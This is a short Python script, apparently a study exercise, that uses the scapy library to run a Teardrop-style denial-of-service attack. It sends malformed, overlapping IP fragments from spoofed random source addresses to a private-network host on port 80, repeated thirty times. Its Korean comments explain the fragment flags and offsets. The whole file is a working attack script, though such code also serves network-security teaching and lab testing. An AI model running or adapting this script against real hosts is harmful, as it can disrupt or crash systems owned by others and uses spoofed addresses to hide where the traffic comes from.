from scapy.all import *
import string
import random
def Teardrop():
    count=30
    src_ip=RandIP()
    src_port=RandNum(1024,65535)
    dst_port=80
    dst_ip = "192.168.27.128"
    data = random.choice(string.ascii_letters + string.digits)
    for i in range(0, count):
        _id = random.choice(range(1, 65535))
        send((IP(src=src_ip, dst=dst_ip, id=_id, flags="MF") / UDP(sport=src_port,dport=dst_port) / ((data * 1420)))) # flag가 MF 로 설정하고 재조시립시 필요한 id값 전송
        print("MF 패킷 전송량 : ",i)
        send((IP(src=src_ip, dst=dst_ip, id=_id, frag=130)) / (data * 1420)) # flag를 정의하지않으면 0으로 명시된다. frag offset값은 비트*8이다. 그래서 130*8은 1040으로 정의된다.
        print("frag 130 패킷 전송량 :",i)
        send((IP(src=src_ip, dst=dst_ip, id=_id, flags="MF", frag=350) / UDP(sport=src_port,dport=dst_port) / (data * 1420))) # frag는 2800을 의미하고 offset이 2800byte임을 의미한다.
        print("2 MF 패킷 전송량",i)
        # flags=0 비트값을 0으로 설정할 시 패킷의 마지막임을 의미한다. 종단 패킷임을 뜻한다. frag는 4160 즉 offset 이 4160byte임을 뜻한다.
        send((IP(src=src_ip, dst=dst_ip, id=_id, flags=0, frag=520) / UDP(sport=src_port,dport=dst_port)) / (data * 1420))
        print("frag 520 패킷 전송량:",i)
Teardrop()